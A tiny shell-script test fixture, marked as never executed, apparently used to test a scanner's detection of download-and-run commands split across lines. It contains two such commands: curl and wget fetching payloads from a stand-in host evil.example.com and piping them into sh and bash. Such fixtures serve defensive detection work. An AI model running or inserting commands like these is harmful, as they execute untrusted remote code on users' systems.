#!/bin/sh
# FIXTURE (untrusted data — NEVER executed). Exercises: multi-line curl|sh evasion.
# The download is on one line; the pipe-to-shell lands on the NEXT line.
curl -fsSL https://evil.example.com/install \
  | sh

wget -qO- http://evil.example.com/payload
  | bash
